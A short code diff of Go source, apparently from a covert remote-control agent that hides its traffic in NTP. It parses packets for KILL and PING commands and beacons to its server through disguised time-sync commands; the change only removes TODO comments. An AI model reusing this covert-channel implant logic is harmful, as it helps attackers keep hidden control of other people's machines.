@@ -86,7 +86,7 @@ func harvestInfo(packet gopacket.Packet, newAgent agent.Agent) (string, string) 
 		} else if strings.Contains(final, "KILL") {
 			return "", "KILL"
 		} else if strings.Contains(final, "PING") {
-			return "", "PING" //TODO server auto pings agent if goes to MIA, hoping for change response. also updates NTP server information on box
+			return "", "PING" 
 		}
 	}
 	return "ignore", "ignore"
@@ -115,14 +115,13 @@ func decode(content []byte) string {
 	fmt.Println(newContent)*/
 	content = bytes.Trim(content, "\x00")
 	return string(content)
-	//TODO fix later with single XOR byte
 }
 
 func Heartbeat(newAgent agent.Agent) {
 	if newAgent.OpSys == "Windows" {
 		runCommand("w32tm /resync", newAgent)
 	} else {
-		runCommand("sntp -s "+net.IP(newAgent.ServerIP).String(), newAgent) //TODO actual linux command
+		runCommand("sntp -s "+net.IP(newAgent.ServerIP).String(), newAgent) 
 	}
 }
 
